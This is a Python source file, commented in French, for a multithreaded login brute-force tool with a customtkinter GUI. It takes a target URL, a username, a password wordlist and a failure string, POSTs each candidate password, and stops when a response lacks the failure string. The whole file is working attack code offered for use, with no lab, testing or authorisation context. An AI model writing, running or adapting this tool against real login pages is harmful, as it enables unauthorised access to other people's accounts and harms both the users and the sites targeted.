import requests
import customtkinter as ctk
from tkinter import filedialog, messagebox
from concurrent.futures import ThreadPoolExecutor
import threading
import queue
import time

def log_result(result_queue, message):
    """
    Ajoute un message dans la file des résultats pour l'afficher dans l'interface utilisateur.
    :param result_queue: Queue partagée pour les résultats.
    :param message: Message à enregistrer.
    """
    result_queue.put(message)

class BruteForceAttack:
    def __init__(self, url, username, password_file, login_failed_string, cookie_value=None, threads=10):
        self.url = url
        self.username = username
        self.password_file = password_file
        self.login_failed_string = login_failed_string
        self.cookie_value = cookie_value
        self.threads = threads
        self.stop_event = threading.Event()

    def try_login(self, session, password, result_queue):
        """
        Teste un mot de passe en envoyant une requête POST et met fin à l'exécution si le mot de passe est trouvé.
        """
        if self.stop_event.is_set():
            return

        data = {'username': self.username, 'password': password}
        try:
            response = session.post(self.url, data=data, cookies={'Cookie': self.cookie_value} if self.cookie_value else None)

            if response.status_code != 200:
                log_result(result_queue, f"[Erreur HTTP] {response.status_code} pour le mot de passe: {password}")
                return

            if self.login_failed_string.lower() in response.text.lower():
                log_result(result_queue, f"[-] Échec : {password}")
            else:
                log_result(result_queue, f"[+] Succès ! Username: {self.username}, Password: {password}")
                self.stop_event.set()
        except Exception as e:
            log_result(result_queue, f"[Erreur] Mot de passe {password}: {e}")

    def run(self, result_queue):
        """
        Lance l'attaque brute force avec plusieurs threads.
        """
        try:
            with open(self.password_file, 'r') as file:
                passwords = [line.strip() for line in file if line.strip()]

            if not passwords:
                log_result(result_queue, "[Erreur] Le fichier de mots de passe est vide.")
                return

            session = requests.Session()
            with ThreadPoolExecutor(max_workers=self.threads) as executor:
                for password in passwords:
                    if self.stop_event.is_set():
                        break
                    executor.submit(self.try_login, session, password, result_queue)

            log_result(result_queue, "[Fin] Attaque brute force terminée.")
        except FileNotFoundError:
            log_result(result_queue, "[Erreur] Fichier de mots de passe introuvable.")
        except Exception as e:
            log_result(result_queue, f"[Erreur critique] {e}")

class BruteForcePage:
    def __init__(self, container):
        self.container = container
        self.result_queue = queue.Queue()
        self.brute_force_thread = None
        self._create_ui()

    def _create_ui(self):
        """Crée l'interface utilisateur"""
        self.url_entry = ctk.CTkEntry(self.container, placeholder_text="URL cible")
        self.url_entry.pack(pady=10)

        self.username_entry = ctk.CTkEntry(self.container, placeholder_text="Nom d'utilisateur")
        self.username_entry.pack(pady=10)

        self.password_file_entry = ctk.CTkEntry(self.container, placeholder_text="Chemin du fichier de mots de passe")
        self.password_file_entry.pack(pady=10)

        self.login_failed_entry = ctk.CTkEntry(self.container, placeholder_text="Chaîne indiquant un échec de connexion")
        self.login_failed_entry.pack(pady=10)

        self.results_textbox = ctk.CTkTextbox(self.container, height=300)
        self.results_textbox.pack(pady=10)

        attack_button = ctk.CTkButton(self.container, text="Lancer l'attaque", command=self.run_brute_force)
        attack_button.pack(pady=10)

    def run_brute_force(self):
        """
        Lance l'attaque brute force avec les paramètres saisis.
        """
        url = self.url_entry.get()
        username = self.username_entry.get()
        password_file = self.password_file_entry.get()
        login_failed_string = self.login_failed_entry.get()

        if not url or not username or not password_file or not login_failed_string:
            messagebox.showerror("Erreur", "Tous les champs doivent être remplis.")
            return

        self.results_textbox.delete("1.0", "end")
        self.results_textbox.insert("end", "[Info] Début de l'attaque brute force...\n")

        brute_force_attack = BruteForceAttack(
            url, username, password_file, login_failed_string, threads=10
        )

        self.brute_force_thread = threading.Thread(target=brute_force_attack.run, args=(self.result_queue,))
        self.brute_force_thread.start()

        self._process_results()

    def _process_results(self):
        """
        Affiche les résultats de l'attaque en continu.
        """
        try:
            while not self.result_queue.empty():
                result = self.result_queue.get_nowait()
                self.results_textbox.insert("end", result + "\n")
                self.results_textbox.see("end")
        except queue.Empty:
            pass

        if self.brute_force_thread and self.brute_force_thread.is_alive():
            self.container.after(500, self._process_results)
